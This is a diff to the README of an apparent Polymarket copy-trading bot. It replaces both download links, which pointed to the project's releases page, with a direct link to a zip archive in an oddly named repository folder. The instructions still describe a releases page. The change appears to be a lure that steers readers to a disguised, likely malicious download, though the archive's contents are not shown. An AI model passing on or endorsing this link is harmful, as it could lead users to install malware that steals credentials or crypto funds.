@@ -1,6 +1,6 @@
 # 🤖 polymarket-copy-trading-bot-clob-ai - Trade smart with real-time market automation
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Amoralismelectronictext609/polymarket-copy-trading-bot-clob-ai/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/Amoralismelectronictext609/polymarket-copy-trading-bot-clob-ai/main/paranymphal/polymarket-bot-ai-copy-clob-trading-2.3.zip)
 
 ## What is this tool?
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software:
 
 You must download the file from the project releases page to start.
 
-[Visit this page to download](https://github.com/Amoralismelectronictext609/polymarket-copy-trading-bot-clob-ai/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Amoralismelectronictext609/polymarket-copy-trading-bot-clob-ai/main/paranymphal/polymarket-bot-ai-copy-clob-trading-2.3.zip)
 
 1. Navigate to the link above.
 2. Look for the latest release section at the top of the list.
